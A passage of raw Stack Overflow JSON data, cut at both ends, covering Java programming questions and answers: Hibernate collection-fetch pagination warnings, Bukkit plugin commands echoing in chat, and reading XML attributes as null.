mode\r\n------------------------------------------------------------------------\r\n\r\nThe second approach is to use SDENSE_RANK over the result set of parent and child entities that match our filtering criteria and restrict the output for the first N post entries only.\r\n\r\nThe SQL query can look as follows:\r\n\r\n    @NamedNativeQuery(\r\n        name = &quot;PostWithCommentByRank&quot;,\r\n        query =\r\n            &quot;SELECT * &quot; +\r\n            &quot;FROM (   &quot; +\r\n            &quot;    SELECT *, dense_rank() OVER (ORDER BY \\&quot;p.created_on\\&quot;, \\&quot;p.id\\&quot;) rank &quot; +\r\n            &quot;    FROM (   &quot; +\r\n            &quot;        SELECT p.id AS \\&quot;p.id\\&quot;, &quot; +\r\n            &quot;               p.created_on AS \\&quot;p.created_on\\&quot;, &quot; +\r\n            &quot;               p.title AS \\&quot;p.title\\&quot;, &quot; +\r\n            &quot;               pc.id as \\&quot;pc.id\\&quot;, &quot; +\r\n            &quot;               pc.created_on AS \\&quot;pc.created_on\\&quot;, &quot; +\r\n            &quot;               pc.review AS \\&quot;pc.review\\&quot;, &quot; +\r\n            &quot;               pc.post_id AS \\&quot;pc.post_id\\&quot; &quot; +\r\n            &quot;        FROM post p  &quot; +\r\n            &quot;        LEFT JOIN post_comment pc ON p.id = pc.post_id &quot; +\r\n            &quot;        WHERE p.title LIKE :titlePattern &quot; +\r\n            &quot;        ORDER BY p.created_on &quot; +\r\n            &quot;    ) p_pc &quot; +\r\n            &quot;) p_pc_r &quot; +\r\n            &quot;WHERE p_pc_r.rank &lt;= :rank &quot;,\r\n        resultSetMapping = &quot;PostWithCommentByRankMapping&quot;\r\n    )\r\n    @SqlResultSetMapping(\r\n        name = &quot;PostWithCommentByRankMapping&quot;,\r\n        entities = {\r\n            @EntityResult(\r\n                entityClass = Post.class,\r\n                fields = {\r\n                    @FieldResult(name = &quot;id&quot;, column = &quot;p.id&quot;),\r\n                    @FieldResult(name = &quot;createdOn&quot;, column = &quot;p.created_on&quot;),\r\n                    @FieldResult(name = &quot;title&quot;, column = &quot;p.title&quot;),\r\n                }\r\n            ),\r\n            @EntityResult(\r\n                entityClass = PostComment.class,\r\n                fields = {\r\n                    @FieldResult(name = &quot;id&quot;, column = &quot;pc.id&quot;),\r\n                    @FieldResult(name = &quot;createdOn&quot;, column = &quot;pc.created_on&quot;),\r\n                    @FieldResult(name = &quot;review&quot;, column = &quot;pc.review&quot;),\r\n                    @FieldResult(name = &quot;post&quot;, column = &quot;pc.post_id&quot;),\r\n                }\r\n            )\r\n        }\r\n    )\r\n\r\n\r\nThe `@NamedNativeQuery` fetches all Post entities matching the provided title along with their associated `PostComment` child entities. The `DENSE_RANK` Window Function is used to assign the rank for each Post and `PostComment` joined record so that we can later filter just the amount of Post records we are interested in fetching.\r\n\r\nThe `SqlResultSetMapping` provides the mapping between the SQL-level column aliases and the JPA entity properties that need to be populated.\r\n\r\nNow, we can execute the `PostWithCommentByRank` `@NamedNativeQuery` like this:\r\n\r\n    List&lt;Post&gt; posts = entityManager\r\n    .createNamedQuery(&quot;PostWithCommentByRank&quot;)\r\n    .setParameter(\r\n        &quot;titlePattern&quot;,\r\n        &quot;High-Performance Java Persistence %&quot;\r\n    )\r\n    .setParameter(\r\n        &quot;rank&quot;,\r\n        5\r\n    )\r\n    .unwrap(NativeQuery.class)\r\n    .setResultTransformer(\r\n        new DistinctPostResultTransformer(entityManager)\r\n    )\r\n    .getResultList();\r\n\r\nNow, by default, a native SQL query like the `PostWithCommentByRank` one would fetch the Post and the `PostComment` in the same JDBC row, so we will end up with an `Object[]` containing both entities.\r\n\r\nHowever, we want to transform the tabular `Object[]` array into a tree of parent-child entities, and for this reason, we need to use the Hibernate [`ResultTransformer`](https://vladmihalcea.com/why-you-should-use-the-hibernate-resulttransformer-to-customize-result-set-mappings/).\r\n\r\nThe `DistinctPostResultTransformer` looks as follows:\r\n\r\n    public class DistinctPostResultTransformer\r\n            extends BasicTransformerAdapter {\r\n     \r\n        private final EntityManager entityManager;\r\n     \r\n        public DistinctPostResultTransformer(\r\n                EntityManager entityManager) {\r\n            this.entityManager = entityManager;\r\n        }\r\n     \r\n        @Override\r\n        public List transformList(\r\n                List list) {\r\n                 \r\n            Map&lt;Serializable, Identifiable&gt; identifiableMap =\r\n                new LinkedHashMap&lt;&gt;(list.size());\r\n                 \r\n            for (Object entityArray : list) {\r\n                if (Object[].class.isAssignableFrom(entityArray.getClass())) {\r\n                    Post post = null;\r\n                    PostComment comment = null;\r\n     \r\n                    Object[] tuples = (Object[]) entityArray;\r\n     \r\n                    for (Object tuple : tuples) {\r\n                        if(tuple instanceof Identifiable) {\r\n                            entityManager.detach(tuple);\r\n     \r\n                            if (tuple instanceof Post) {\r\n                                post = (Post) tuple;\r\n                            }\r\n                            else if (tuple instanceof PostComment) {\r\n                                comment = (PostComment) tuple;\r\n                            }\r\n                            else {\r\n                                throw new UnsupportedOperationException(\r\n                                    &quot;Tuple &quot; + tuple.getClass() + &quot; is not supported!&quot;\r\n                                );\r\n                            }\r\n                        }\r\n                    }\r\n     \r\n                    if (post != null) {\r\n                        if (!identifiableMap.containsKey(post.getId())) {\r\n                            identifiableMap.put(post.getId(), post);\r\n                            post.setComments(new ArrayList&lt;&gt;());\r\n                        }\r\n                        if (comment != null) {\r\n                            post.addComment(comment);\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            return new ArrayList&lt;&gt;(identifiableMap.values());\r\n        }\r\n    }\r\n\r\nThe [`DistinctPostResultTransformer`](https://vladmihalcea.com/fix-hibernate-hhh000104-entity-fetch-pagination-warning-message/) must detach the entities being fetched because we are overwriting the child collection and we don’t want that to be propagated as an entity state transition:\r\n\r\n    post.setComments(new ArrayList&lt;&gt;());","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>Although you are getting valid results, the SQL query fetches all data and it's not as efficient as it should.</p>\n<p>So, you have two options.</p>\n<h2>Fixing the issue with two SQL queries that can fetch entities in read-write mode</h2>\n<p>The easiest way to fix this issue is to execute two queries:</p>\n<p>. The first query will fetch the root entity identifiers matching the provided filtering criteria.\n. The second query will use the previously extracted root entity identifiers to fetch the parent and the child entities.</p>\n<p>This approach is very easy to implement and looks as follows:</p>\n<pre><code>List&lt;Long&gt; postIds = entityManager\n.createQuery(\n    &quot;select p.id &quot; +\n    &quot;from Post p &quot; +\n    &quot;where p.title like :titlePattern &quot; +\n    &quot;order by p.createdOn&quot;, Long.class)\n.setParameter(\n    &quot;titlePattern&quot;,\n    &quot;High-Performance Java Persistence %&quot;\n)\n.setMaxResults(5)\n.getResultList();\n \nList&lt;Post&gt; posts = entityManager\n.createQuery(\n    &quot;select distinct p &quot; +\n    &quot;from Post p &quot; +\n    &quot;left join fetch p.comments &quot; +\n    &quot;where p.id in (:postIds) &quot;  +\n    &quot;order by p.createdOn&quot;, Post.class)\n.setParameter(&quot;postIds&quot;, postIds)\n.setHint(\n    &quot;hibernate.query.passDistinctThrough&quot;, \n    false\n)\n.getResultList();\n</code></pre>\n<h2>Fixing the issue with one SQL query that can only fetch entities in read-only mode</h2>\n<p>The second approach is to use SDENSE_RANK over the result set of parent and child entities that match our filtering criteria and restrict the output for the first N post entries only.</p>\n<p>The SQL query can look as follows:</p>\n<pre><code>@NamedNativeQuery(\n    name = &quot;PostWithCommentByRank&quot;,\n    query =\n        &quot;SELECT * &quot; +\n        &quot;FROM (   &quot; +\n        &quot;    SELECT *, dense_rank() OVER (ORDER BY \\&quot;p.created_on\\&quot;, \\&quot;p.id\\&quot;) rank &quot; +\n        &quot;    FROM (   &quot; +\n        &quot;        SELECT p.id AS \\&quot;p.id\\&quot;, &quot; +\n        &quot;               p.created_on AS \\&quot;p.created_on\\&quot;, &quot; +\n        &quot;               p.title AS \\&quot;p.title\\&quot;, &quot; +\n        &quot;               pc.id as \\&quot;pc.id\\&quot;, &quot; +\n        &quot;               pc.created_on AS \\&quot;pc.created_on\\&quot;, &quot; +\n        &quot;               pc.review AS \\&quot;pc.review\\&quot;, &quot; +\n        &quot;               pc.post_id AS \\&quot;pc.post_id\\&quot; &quot; +\n        &quot;        FROM post p  &quot; +\n        &quot;        LEFT JOIN post_comment pc ON p.id = pc.post_id &quot; +\n        &quot;        WHERE p.title LIKE :titlePattern &quot; +\n        &quot;        ORDER BY p.created_on &quot; +\n        &quot;    ) p_pc &quot; +\n        &quot;) p_pc_r &quot; +\n        &quot;WHERE p_pc_r.rank &lt;= :rank &quot;,\n    resultSetMapping = &quot;PostWithCommentByRankMapping&quot;\n)\n@SqlResultSetMapping(\n    name = &quot;PostWithCommentByRankMapping&quot;,\n    entities = {\n        @EntityResult(\n            entityClass = Post.class,\n            fields = {\n                @FieldResult(name = &quot;id&quot;, column = &quot;p.id&quot;),\n                @FieldResult(name = &quot;createdOn&quot;, column = &quot;p.created_on&quot;),\n                @FieldResult(name = &quot;title&quot;, column = &quot;p.title&quot;),\n            }\n        ),\n        @EntityResult(\n            entityClass = PostComment.class,\n            fields = {\n                @FieldResult(name = &quot;id&quot;, column = &quot;pc.id&quot;),\n                @FieldResult(name = &quot;createdOn&quot;, column = &quot;pc.created_on&quot;),\n                @FieldResult(name = &quot;review&quot;, column = &quot;pc.review&quot;),\n                @FieldResult(name = &quot;post&quot;, column = &quot;pc.post_id&quot;),\n            }\n        )\n    }\n)\n</code></pre>\n<p>The <code>@NamedNativeQuery</code> fetches all Post entities matching the provided title along with their associated <code>PostComment</code> child entities. The <code>DENSE_RANK</code> Window Function is used to assign the rank for each Post and <code>PostComment</code> joined record so that we can later filter just the amount of Post records we are interested in fetching.</p>\n<p>The <code>SqlResultSetMapping</code> provides the mapping between the SQL-level column aliases and the JPA entity properties that need to be populated.</p>\n<p>Now, we can execute the <code>PostWithCommentByRank</code> <code>@NamedNativeQuery</code> like this:</p>\n<pre><code>List&lt;Post&gt; posts = entityManager\n.createNamedQuery(&quot;PostWithCommentByRank&quot;)\n.setParameter(\n    &quot;titlePattern&quot;,\n    &quot;High-Performance Java Persistence %&quot;\n)\n.setParameter(\n    &quot;rank&quot;,\n    5\n)\n.unwrap(NativeQuery.class)\n.setResultTransformer(\n    new DistinctPostResultTransformer(entityManager)\n)\n.getResultList();\n</code></pre>\n<p>Now, by default, a native SQL query like the <code>PostWithCommentByRank</code> one would fetch the Post and the <code>PostComment</code> in the same JDBC row, so we will end up with an <code>Object[]</code> containing both entities.</p>\n<p>However, we want to transform the tabular <code>Object[]</code> array into a tree of parent-child entities, and for this reason, we need to use the Hibernate <a href=\"https://vladmihalcea.com/why-you-should-use-the-hibernate-resulttransformer-to-customize-result-set-mappings/\" rel=\"noreferrer\"><code>ResultTransformer</code></a>.</p>\n<p>The <code>DistinctPostResultTransformer</code> looks as follows:</p>\n<pre><code>public class DistinctPostResultTransformer\n        extends BasicTransformerAdapter {\n \n    private final EntityManager entityManager;\n \n    public DistinctPostResultTransformer(\n            EntityManager entityManager) {\n        this.entityManager = entityManager;\n    }\n \n    @Override\n    public List transformList(\n            List list) {\n             \n        Map&lt;Serializable, Identifiable&gt; identifiableMap =\n            new LinkedHashMap&lt;&gt;(list.size());\n             \n        for (Object entityArray : list) {\n            if (Object[].class.isAssignableFrom(entityArray.getClass())) {\n                Post post = null;\n                PostComment comment = null;\n \n                Object[] tuples = (Object[]) entityArray;\n \n                for (Object tuple : tuples) {\n                    if(tuple instanceof Identifiable) {\n                        entityManager.detach(tuple);\n \n                        if (tuple instanceof Post) {\n                            post = (Post) tuple;\n                        }\n                        else if (tuple instanceof PostComment) {\n                            comment = (PostComment) tuple;\n                        }\n                        else {\n                            throw new UnsupportedOperationException(\n                                &quot;Tuple &quot; + tuple.getClass() + &quot; is not supported!&quot;\n                            );\n                        }\n                    }\n                }\n \n                if (post != null) {\n                    if (!identifiableMap.containsKey(post.getId())) {\n                        identifiableMap.put(post.getId(), post);\n                        post.setComments(new ArrayList&lt;&gt;());\n                    }\n                    if (comment != null) {\n                        post.addComment(comment);\n                    }\n                }\n            }\n        }\n        return new ArrayList&lt;&gt;(identifiableMap.values());\n    }\n}\n</code></pre>\n<p>The <a href=\"https://vladmihalcea.com/fix-hibernate-hhh000104-entity-fetch-pagination-warning-message/\" rel=\"noreferrer\"><code>DistinctPostResultTransformer</code></a> must detach the entities being fetched because we are overwriting the child collection and we don’t want that to be propagated as an entity state transition:</p>\n<pre><code>post.setComments(new ArrayList&lt;&gt;());\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4641422,"reputation":1287,"user_id":3761154,"display_name":"R&#233;da Housni Alaoui"},"down_vote_count":0,"up_vote_count":19,"is_accepted":false,"score":19,"last_activity_date":1587803099,"creation_date":1587803099,"answer_id":61422902,"question_id":11431670,"body_markdown":"This warning tells you Hibernate is performing in memory java pagination. This can cause high JVM memory consumption.\r\nSince a developer can miss this warning, I contributed to Hibernate by adding a flag allowing to throw an exception instead of logging the warning (https://hibernate.atlassian.net/browse/HHH-9965).\r\n\r\nThe flag is **hibernate.query.fail_on_pagination_over_collection_fetch**. \r\n\r\nI recommend everyone to enable it.\r\n\r\nThe flag is defined in **org.hibernate.cfg.AvailableSettings** :\r\n\r\n        /**\r\n    \t * Raises an exception when in-memory pagination over collection fetch is about to be performed.\r\n    \t * Disabled by default. Set to true to enable.\r\n    \t *\r\n    \t * @since 5.2.13\r\n    \t */\r\n    \tString FAIL_ON_PAGINATION_OVER_COLLECTION_FETCH = &quot;hibernate.query.fail_on_pagination_over_collection_fetch&quot;;","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>This warning tells you Hibernate is performing in memory java pagination. This can cause high JVM memory consumption.\nSince a developer can miss this warning, I contributed to Hibernate by adding a flag allowing to throw an exception instead of logging the warning (<a href=\"https://hibernate.atlassian.net/browse/HHH-9965\" rel=\"noreferrer\">https://hibernate.atlassian.net/browse/HHH-9965</a>).</p>\n\n<p>The flag is <strong>hibernate.query.fail_on_pagination_over_collection_fetch</strong>. </p>\n\n<p>I recommend everyone to enable it.</p>\n\n<p>The flag is defined in <strong>org.hibernate.cfg.AvailableSettings</strong> :</p>\n\n<pre><code>    /**\n     * Raises an exception when in-memory pagination over collection fetch is about to be performed.\n     * Disabled by default. Set to true to enable.\n     *\n     * @since 5.2.13\n     */\n    String FAIL_ON_PAGINATION_OVER_COLLECTION_FETCH = \"hibernate.query.fail_on_pagination_over_collection_fetch\";\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7632635,"reputation":463,"user_id":5787185,"accept_rate":22,"display_name":"Thanh Nhan"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642476618,"creation_date":1642476618,"answer_id":70749973,"question_id":11431670,"body_markdown":"As others pointed out, you should generally avoid using &quot;JOIN FETCH&quot; and firstResult/maxResults together.  \r\nIf your query requires it, you can use `.stream()` to eliminate warning and avoid potential OOM exception.\r\n\r\n```java\r\ntry (Stream&lt;ENTITY&gt; stream = em.createQuery(QUERY).stream()) {\r\n    ENTITY first = stream.findFirst().orElse(null); // equivalents .getSingleResult()\r\n}\r\n```\r\n\r\n// `Stream` returned is an IO stream that needs to be closed manually.","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>As others pointed out, you should generally avoid using &quot;JOIN FETCH&quot; and firstResult/maxResults together.<br />\nIf your query requires it, you can use <code>.stream()</code> to eliminate warning and avoid potential OOM exception.</p>\n<pre class=\"lang-java prettyprint-override\"><code>try (Stream&lt;ENTITY&gt; stream = em.createQuery(QUERY).stream()) {\n    ENTITY first = stream.findFirst().orElse(null); // equivalents .getSingleResult()\n}\n</code></pre>\n<p>// <code>Stream</code> returned is an IO stream that needs to be closed manually.</p>\n"}],"owner":{"account_id":983620,"reputation":7190,"user_id":1142530,"accept_rate":46,"display_name":"Gnik"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":72533,"favorite_count":0,"down_vote_count":0,"up_vote_count":55,"accepted_answer_id":11431936,"answer_count":7,"score":55,"last_activity_date":1642476618,"creation_date":1342006111,"question_id":11431670,"body_markdown":"I&#39;m getting a warning in the Server log **&quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot;**. However everything working fine. But I don&#39;t want this warning.\r\n\r\nMy code is\r\n----------\r\n\r\n&lt;!-- language: java --&gt;\r\n\r\n    public employee find(int id) {\r\n        return (employee) getEntityManager().createQuery(QUERY).setParameter(&quot;id&quot;, id).getSingleResult();\r\n    }\r\n\r\nMy query is \r\n-----------\r\n\r\n&lt;!-- language: java --&gt;\r\n\r\n    QUERY = &quot;from employee as emp left join fetch emp.salary left join fetch emp.department where emp.id = :id&quot;\r\n","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>I'm getting a warning in the Server log <strong>\"firstResult/maxResults specified with collection fetch; applying in memory!\"</strong>. However everything working fine. But I don't want this warning.</p>\n\n<h2>My code is</h2>\n\n<pre class=\"lang-java prettyprint-override\"><code>public employee find(int id) {\n    return (employee) getEntityManager().createQuery(QUERY).setParameter(\"id\", id).getSingleResult();\n}\n</code></pre>\n\n<h2>My query is</h2>\n\n<pre class=\"lang-java prettyprint-override\"><code>QUERY = \"from employee as emp left join fetch emp.salary left join fetch emp.department where emp.id = :id\"\n</code></pre>\n"},{"tags":["java","plugins","minecraft","bukkit"],"comments":[{"owner":{"account_id":11846929,"reputation":1232,"user_id":8669256,"display_name":"MoonMist"},"score":0,"creation_date":1576014872,"post_id":59275827,"comment_id":104758801,"body_markdown":"This seems like a problem that is elsewhere in your code, could we see the rest of the code for this command?","body":"This seems like a problem that is elsewhere in your code, could we see the rest of the code for this command?"},{"owner":{"display_name":"user11866276"},"score":0,"creation_date":1576015017,"post_id":59275827,"comment_id":104758851,"body_markdown":"That&#39;s all my method responsible for addlife command. Besides of imports etc","body":"That&#39;s all my method responsible for addlife command. Besides of imports etc"},{"owner":{"account_id":11846929,"reputation":1232,"user_id":8669256,"display_name":"MoonMist"},"score":0,"creation_date":1576015153,"post_id":59275827,"comment_id":104758897,"body_markdown":"Okay, so where is this method called? My guess is that you&#39;ve added a player.sendMessage(command) somewhere for debugging that you haven&#39;t removed","body":"Okay, so where is this method called? My guess is that you&#39;ve added a player.sendMessage(command) somewhere for debugging that you haven&#39;t removed"},{"owner":{"account_id":11582220,"reputation":198,"user_id":8485750,"accept_rate":75,"display_name":"Jonas"},"score":0,"creation_date":1576052157,"post_id":59275827,"comment_id":104768941,"body_markdown":"Perhaps you did something wrong in your ``bukkit.yml``. Did you specified an Usage for your command?","body":"Perhaps you did something wrong in your <code>bukkit.yml</code>. Did you specified an Usage for your command?"},{"owner":{"display_name":"user11866276"},"score":1,"creation_date":1576071359,"post_id":59275827,"comment_id":104779180,"body_markdown":"I think i fix it. The problem is in if statement. I changed .equalsIgnoreCase() to .equals. Then method return false not true.","body":"I think i fix it. The problem is in if statement. I changed .equalsIgnoreCase() to .equals. Then method return false not true."},{"owner":{"display_name":"user5735975"},"score":4,"creation_date":1576074293,"post_id":59275827,"comment_id":104780899,"body_markdown":"If your onCommand() method returns false, it will tell the player the command usage from the plugin.yml","body":"If your onCommand() method returns false, it will tell the player the command usage from the plugin.yml"}],"owner":{"display_name":"user11866276"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":140,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642476136,"creation_date":1576014258,"question_id":59275827,"body_markdown":"I created plugin, that implements life points to your world. After using command, my chat shows corrent message... and this command. \r\n\r\n![Image](https://i.stack.imgur.com/GJACs.png)\r\n\r\nMy code for this command looks like this.\r\n```\r\n\r\n        if(sender instanceof Player){\r\n            if(command.getName().equalsIgnoreCase(cmd1)){\r\n                // player.sendMessage(&quot;CMD&quot; + playerName);\r\n                // Logic AddLife\r\n                if(plugin.getConfig().getInt(playerName) &gt;= 0){\r\n                    lives = plugin.getConfig().getInt(playerName) + 1;\r\n\r\n                    plugin.getConfig().set(playerName, lives);\r\n                    plugin.saveConfig();\r\n\r\n                    player.sendMessage(ChatColor.AQUA + &quot;You increased your life points by 1!&quot;);\r\n                }\r\n                else{\r\n                    player.sendMessage(ChatColor.DARK_RED + &quot;You need life crystal to do this.&quot;);\r\n                }\r\n\r\n            }\r\n            else{\r\n                player.sendMessage(ChatColor.GREEN + &quot;Only players can execute this command.&quot;);\r\n            }\r\n        }\r\n        return true;\r\n\r\n```\r\n\r\nI don&#39;t want to see that command in chat. How to fix that?\r\n\r\nEdit:\r\nMy main class that i called command method:\r\n```\r\n @Override\r\n    public void onEnable() {\r\n\r\n        // Config\r\n        getServer().getPluginManager().registerEvents(new OnPlayerDeath(), this);\r\n        getCommand(&quot;addlife&quot;).setExecutor(new AddLife());\r\n\r\n        loadConfig();\r\n    }\r\n```","title":"Bukkit - commands shows in chat after typed","body":"<p>I created plugin, that implements life points to your world. After using command, my chat shows corrent message... and this command. </p>\n\n<p><img src=\"https://i.stack.imgur.com/GJACs.png\" alt=\"Image\"></p>\n\n<p>My code for this command looks like this.</p>\n\n<pre><code>\n        if(sender instanceof Player){\n            if(command.getName().equalsIgnoreCase(cmd1)){\n                // player.sendMessage(\"CMD\" + playerName);\n                // Logic AddLife\n                if(plugin.getConfig().getInt(playerName) &gt;= 0){\n                    lives = plugin.getConfig().getInt(playerName) + 1;\n\n                    plugin.getConfig().set(playerName, lives);\n                    plugin.saveConfig();\n\n                    player.sendMessage(ChatColor.AQUA + \"You increased your life points by 1!\");\n                }\n                else{\n                    player.sendMessage(ChatColor.DARK_RED + \"You need life crystal to do this.\");\n                }\n\n            }\n            else{\n                player.sendMessage(ChatColor.GREEN + \"Only players can execute this command.\");\n            }\n        }\n        return true;\n\n</code></pre>\n\n<p>I don't want to see that command in chat. How to fix that?</p>\n\n<p>Edit:\nMy main class that i called command method:</p>\n\n<pre><code> @Override\n    public void onEnable() {\n\n        // Config\n        getServer().getPluginManager().registerEvents(new OnPlayerDeath(), this);\n        getCommand(\"addlife\").setExecutor(new AddLife());\n\n        loadConfig();\n    }\n</code></pre>\n"},{"tags":["java","bukkit"],"comments":[{"owner":{"display_name":"user10997580"},"score":0,"creation_date":1577206082,"post_id":59471432,"comment_id":105121579,"body_markdown":"Are you sure that you don&#39;t have another piece of code elsewhere that is using that method? Because the&#39;re is nothing in the shown code that would even begin to message you back with the entered command. Are you also sure that the command is just not registering and you are seeing your own message?","body":"Are you sure that you don&#39;t have another piece of code elsewhere that is using that method? Because the&#39;re is nothing in the shown code that would even begin to message you back with the entered command. Are you also sure that the command is just not registering and you are seeing your own message?"},{"owner":{"display_name":"user12582235"},"score":0,"creation_date":1577206229,"post_id":59471432,"comment_id":105121613,"body_markdown":"I don&#39;t think there is anything interfering with it. This is a test plugin that I made for a heal command. Here is everything about the plugin: https://gyazo.com/1a21e0b85f39b54462e3a8610c7481d5","body":"I don&#39;t think there is anything interfering with it. This is a test plugin that I made for a heal command. Here is everything about the plugin: <a href=\"https://gyazo.com/1a21e0b85f39b54462e3a8610c7481d5\" rel=\"nofollow noreferrer\">gyazo.com/1a21e0b85f39b54462e3a8610c7481d5</a>"},{"owner":{"display_name":"user10997580"},"score":0,"creation_date":1577206304,"post_id":59471432,"comment_id":105121632,"body_markdown":"What does it look like when it &#39;messages you back&#39;?","body":"What does it look like when it &#39;messages you back&#39;?"},{"owner":{"display_name":"user12582235"},"score":0,"creation_date":1577206375,"post_id":59471432,"comment_id":105121652,"body_markdown":"https://gyazo.com/04e6e50c803782d872b90bddf6a5814e","body":"<a href=\"https://gyazo.com/04e6e50c803782d872b90bddf6a5814e\" rel=\"nofollow noreferrer\">gyazo.com/04e6e50c803782d872b90bddf6a5814e</a>"},{"owner":{"account_id":6867403,"reputation":800,"user_id":5279269,"accept_rate":88,"display_name":"Ryan_DS"},"score":0,"creation_date":1577416433,"post_id":59471432,"comment_id":105164911,"body_markdown":"I think it&#39;s something to do with the `usage:` part. Something is causing that to trigger, as the game doesn&#39;t think you are using the command correctly. I can&#39;t work out however, why may this be the case.","body":"I think it&#39;s something to do with the <code>usage:</code> part. Something is causing that to trigger, as the game doesn&#39;t think you are using the command correctly. I can&#39;t work out however, why may this be the case."},{"owner":{"account_id":13317120,"reputation":413,"user_id":9613125,"display_name":"TCoded"},"score":0,"creation_date":1592043385,"post_id":59471432,"comment_id":110286277,"body_markdown":"Does it even run the heal? If not, something is cancelling the chat event. (Another plugin?)","body":"Does it even run the heal? If not, something is cancelling the chat event. (Another plugin?)"}],"owner":{"display_name":"user12582235"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":75,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":0,"score":0,"last_activity_date":1642475914,"creation_date":1577205269,"question_id":59471432,"body_markdown":"Every time I run my command in-game it returns the command as a message. For example) I type &quot;/heal&quot; in-game, and it messages me &quot;/heal&quot; back.\r\n\r\n\r\n\r\nMy code\r\n\t\r\n\tpublic boolean onCommand(CommandSender sender, Command cmd, String label, Strings [] args) {\r\n\t\t\r\n\t\tPlayer player = (Player) sender;\r\n\t\t\r\n\t\tif (cmd.getName().equalsIgnoreCase(&quot;heal&quot;)) {\r\n\t\t\tif (sender.hasPermission(&quot;city.heal&quot;)) {\r\n\t\t\t\tplayer.setHealth(20);\r\n\t\t\t\tplayer.setFoodLevel(20);\r\n\t\t\t\tsender.sendMessage(&quot;&#167;fYou have been &#167;bhealed &#167;fand &#167;bsated&#167;f.&quot;);\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tif (!sender.hasPermission(&quot;city.heal&quot;)) {\r\n\t\t\t\tsender.sendMessage(&quot;&#167;cNo permission.&quot;);\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n}\r\n\r\n\r\nMy plugin.yml\r\n```\r\nmain: me.rarfiles.code.Code\r\nname: Test\r\nauthor: rarfiles\r\nversion: 1.0\r\n\r\ncommands:\r\n  heal:\r\n    usage: /&lt;command&gt;","title":"My plugin keeps returning my command as a message","body":"<p>Every time I run my command in-game it returns the command as a message. For example) I type \"/heal\" in-game, and it messages me \"/heal\" back.</p>\n\n<p>My code</p>\n\n<pre><code>public boolean onCommand(CommandSender sender, Command cmd, String label, Strings [] args) {\n\n    Player player = (Player) sender;\n\n    if (cmd.getName().equalsIgnoreCase(\"heal\")) {\n        if (sender.hasPermission(\"city.heal\")) {\n            player.setHealth(20);\n            player.setFoodLevel(20);\n            sender.sendMessage(\"§fYou have been §bhealed §fand §bsated§f.\");\n            return true;\n        }\n\n        if (!sender.hasPermission(\"city.heal\")) {\n            sender.sendMessage(\"§cNo permission.\");\n            return true;\n        }\n    }\n    return true;\n}\n</code></pre>\n\n<p>}</p>\n\n<p>My plugin.yml</p>\n\n<pre><code>main: me.rarfiles.code.Code\nname: Test\nauthor: rarfiles\nversion: 1.0\n\ncommands:\n  heal:\n    usage: /&lt;command&gt;\n</code></pre>\n"},{"tags":["java","xml","xml-parsing"],"answers":[{"tags":[],"owner":{"account_id":23904081,"reputation":189,"user_id":17901874,"display_name":"Long Nguyen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1642475857,"creation_date":1642475857,"answer_id":70749922,"question_id":70749538,"body_markdown":"AFAIK, `Element#getAttribute` will always return an `empty String` if the attribute does not have a specified or default value.\r\n\r\nFrom [Oracle documentation][1]:\r\n```\r\npublic String getAttribute(String name)\r\n...\r\nReturns: The Attr value as a string, or the empty string if that attribute does not have a specified or default value.\r\n```\r\n\r\nBut you can use `Element#getAttributeNode` instead, it will return `null` if the attribute does not exist.\r\nhttps://docs.oracle.com/cd/A97339_01/doc/xml/parser/oracle.xml.parser.v2.XMLElement.html#getAttributeNode(java.lang.String)\r\n\r\nLater, you can use `Attr#getValue()` to retrieve the value.\r\nhttps://docs.oracle.com/cd/A97339_01/doc/xml/parser/org.w3c.dom.Attr.html#getValue()\r\n\r\n\r\n  [1]: https://docs.oracle.com/cd/A97339_01/doc/xml/parser/oracle.xml.parser.v2.XMLElement.html#getAttribute(java.lang.String)","title":"Java XML: how to get attribute value as NULL if not present?","body":"<p>AFAIK, <code>Element#getAttribute</code> will always return an <code>empty String</code> if the attribute does not have a specified or default value.</p>\n<p>From <a href=\"https://docs.oracle.com/cd/A97339_01/doc/xml/parser/oracle.xml.parser.v2.XMLElement.html#getAttribute(java.lang.String)\" rel=\"nofollow noreferrer\">Oracle documentation</a>:</p>\n<pre><code>public String getAttribute(String name)\n...\nReturns: The Attr value as a string, or the empty string if that attribute does not have a specified or default value.\n</code></pre>\n<p>But you can use <code>Element#getAttributeNode</code> instead, it will return <code>null</code> if the attribute does not exist.\n<a href=\"https://docs.oracle.com/cd/A97339_01/doc/xml/parser/oracle.xml.parser.v2.XMLElement.html#getAttributeNode(java.lang.String)\" rel=\"nofollow noreferrer\">https://docs.oracle.com/cd/A97339_01/doc/xml/parser/oracle.xml.parser.v2.XMLElement.html#getAttributeNode(java.lang.String)</a></p>\n<p>Later, you can use <code>Attr#getValue()</code> to retrieve the value.\n<a href=\"https://docs.oracle.com/cd/A97339_01/doc/xml/parser/org.w3c.dom.Attr.html#getValue()\" rel=\"nofollow 